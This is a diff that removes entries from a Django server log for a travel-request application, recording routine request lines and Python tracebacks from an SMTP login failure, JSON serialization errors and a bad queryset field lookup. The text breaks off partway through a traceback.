@@ -1,765 +1,159 @@
-INFO|16/Mar/2021 12:24:23|basehttp|8827|140322311718656|"POST /get_approve_reject_request_by_mail/ HTTP/1.1" 200 59
-INFO|16/Mar/2021 13:27:09|basehttp|8827|140322311718656|"POST /get_approve_reject_request_by_mail/ HTTP/1.1" 200 59
-ERROR|16/Mar/2021 13:36:09|log|8827|140322311718656|Internal Server Error: /get_approve_reject_request_by_mail/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 2693, in post
-    id=request.data['travel_req_id'])
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3137, in sendmails
-    msg.send()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/mail/message.py", line 291, in send
-    return self.get_connection(fail_silently).send_messages([self])
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/mail/backends/smtp.py", line 103, in send_messages
-    new_conn_created = self.open()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/mail/backends/smtp.py", line 70, in open
-    self.connection.login(self.username, self.password)
-  File "/usr/lib/python3.7/smtplib.py", line 730, in login
-    raise last_exception
-  File "/usr/lib/python3.7/smtplib.py", line 721, in login
-    initial_response_ok=initial_response_ok)
-  File "/usr/lib/python3.7/smtplib.py", line 642, in auth
-    raise SMTPAuthenticationError(code, resp)
-smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepted. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials i10sm25889296pjm.1 - gsmtp')
-ERROR|16/Mar/2021 13:36:09|basehttp|8827|140322311718656|"POST /get_approve_reject_request_by_mail/ HTTP/1.1" 500 20437
-INFO|16/Mar/2021 15:41:10|basehttp|15864|139940543801088|"POST /get_add/employee/ HTTP/1.1" 200 73
-ERROR|16/Mar/2021 15:42:38|log|15978|139767276529408|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type IndexError is not JSON serializable
-ERROR|16/Mar/2021 15:42:38|basehttp|15978|139767276529408|"POST /get_add/employee/ HTTP/1.1" 500 109105
-INFO|16/Mar/2021 16:02:58|basehttp|16619|140532374349568|"POST /get_add/employee/ HTTP/1.1" 201 1426
-ERROR|16/Mar/2021 16:04:56|log|16619|140532374349568|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type IndexError is not JSON serializable
-ERROR|16/Mar/2021 16:04:56|basehttp|16619|140532374349568|"POST /get_add/employee/ HTTP/1.1" 500 109105
-ERROR|16/Mar/2021 16:06:40|log|16619|140532374349568|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type IndexError is not JSON serializable
-ERROR|16/Mar/2021 16:06:40|basehttp|16619|140532374349568|"POST /get_add/employee/ HTTP/1.1" 500 109105
-ERROR|16/Mar/2021 16:07:07|log|16619|140532374349568|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type IndexError is not JSON serializable
-ERROR|16/Mar/2021 16:07:07|basehttp|16619|140532374349568|"POST /get_add/employee/ HTTP/1.1" 500 109105
-INFO|16/Mar/2021 16:08:12|basehttp|16619|140532374349568|"POST /get_add/employee/ HTTP/1.1" 201 1426
-ERROR|16/Mar/2021 16:09:41|log|16974|140672460609280|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type IndexError is not JSON serializable
-ERROR|16/Mar/2021 16:09:41|basehttp|16974|140672460609280|"POST /get_add/employee/ HTTP/1.1" 500 109105
-ERROR|16/Mar/2021 16:11:05|log|17030|139795188360960|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type IndexError is not JSON serializable
-ERROR|16/Mar/2021 16:11:05|basehttp|17030|139795188360960|"POST /get_add/employee/ HTTP/1.1" 500 109105
-INFO|16/Mar/2021 16:14:35|basehttp|17119|140309829469952|"POST /get_add/employee/ HTTP/1.1" 201 117
-INFO|16/Mar/2021 16:15:56|basehttp|17119|140309829469952|"POST /get_add/employee/ HTTP/1.1" 201 1451
-WARNING|16/Mar/2021 16:26:14|log|17430|140691669767936|Unauthorized: /get_add/employee/
-WARNING|16/Mar/2021 16:26:14|basehttp|17430|140691669767936|"POST /get_add/employee/ HTTP/1.1" 401 183
-WARNING|16/Mar/2021 16:26:38|log|17430|140691669767936|Bad Request: /get_add/employee/
-WARNING|16/Mar/2021 16:26:38|basehttp|17430|140691669767936|"POST /get_add/employee/ HTTP/1.1" 400 110
-WARNING|16/Mar/2021 16:26:54|log|17430|140691669767936|Bad Request: /get_add/employee/
-WARNING|16/Mar/2021 16:26:54|basehttp|17430|140691669767936|"POST /get_add/employee/ HTTP/1.1" 400 84
-WARNING|16/Mar/2021 16:27:20|log|17430|140691669767936|Bad Request: /get_add/employee/
-WARNING|16/Mar/2021 16:27:20|basehttp|17430|140691669767936|"POST /get_add/employee/ HTTP/1.1" 400 110
-WARNING|16/Mar/2021 16:27:54|log|17430|140691669767936|Bad Request: /get_add/employee/
-WARNING|16/Mar/2021 16:27:54|basehttp|17430|140691669767936|"POST /get_add/employee/ HTTP/1.1" 400 110
-ERROR|16/Mar/2021 16:28:18|log|17430|140691669767936|Internal Server Error: /get_add/employee/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 156, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 154, in _get_response
-    response = response.render()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/template/response.py", line 106, in render
-    self.content = self.rendered_content
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/response.py", line 70, in rendered_content
-    ret = renderer.render(self.data, accepted_media_type, context)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/renderers.py", line 103, in render
-    allow_nan=not self.strict, separators=separators
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/json.py", line 25, in dumps
-    return json.dumps(*args, **kwargs)
-  File "/usr/lib/python3.7/json/__init__.py", line 238, in dumps
-    **kw).encode(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 199, in encode
-    chunks = self.iterencode(o, _one_shot=True)
-  File "/usr/lib/python3.7/json/encoder.py", line 257, in iterencode
-    return _iterencode(o, 0)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/utils/encoders.py", line 67, in default
-    return super().default(obj)
-  File "/usr/lib/python3.7/json/encoder.py", line 179, in default
-    raise TypeError(f'Object of type {o.__class__.__name__} '
-TypeError: Object of type SMTPAuthenticationError is not JSON serializable
-ERROR|16/Mar/2021 16:28:18|basehttp|17430|140691669767936|"POST /get_add/employee/ HTTP/1.1" 500 110351
-INFO|16/Mar/2021 16:29:03|basehttp|17653|140659894466304|"POST /get_add/employee/ HTTP/1.1" 201 113
-INFO|16/Mar/2021 16:33:29|basehttp|17786|140014922704640|"POST /get_add/employee/ HTTP/1.1" 201 113
-INFO|16/Mar/2021 16:34:34|basehttp|17786|140014922704640|"POST /get_add/employee/ HTTP/1.1" 201 1458
-ERROR|16/Mar/2021 17:27:39|log|20020|140713556395776|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1735, in add_fields
-    join_info = self.setup_joins(name.split(LOOKUP_SEP), opts, alias, allow_many=allow_m2m)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword '2' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values('2').annotate(total=Count(emp_code))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
-    return getattr(self.get_queryset(), name)(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 750, in values
-    clone = self._values(*fields, **expressions)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 745, in _values
-    clone.query.set_values(fields)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1987, in set_values
-    self.add_fields(field_names, True)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1758, in add_fields
-    "Choices are: %s" % (name, ", ".join(names)))
-django.core.exceptions.FieldError: Cannot resolve keyword '2' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 17:27:39|basehttp|20020|140713556395776|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 23930
-ERROR|16/Mar/2021 17:31:16|log|20348|140188203046656|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1735, in add_fields
-    join_info = self.setup_joins(name.split(LOOKUP_SEP), opts, alias, allow_many=allow_m2m)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'nitesh001' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values(emp_code).annotate(total=Count(emp_code))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
-    return getattr(self.get_queryset(), name)(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 750, in values
-    clone = self._values(*fields, **expressions)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 745, in _values
-    clone.query.set_values(fields)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1987, in set_values
-    self.add_fields(field_names, True)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1758, in add_fields
-    "Choices are: %s" % (name, ", ".join(names)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'nitesh001' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 17:31:16|basehttp|20348|140188203046656|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 23959
-ERROR|16/Mar/2021 17:33:03|log|20474|139626560571136|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values('created_by').annotate(total=Count(emp_code))
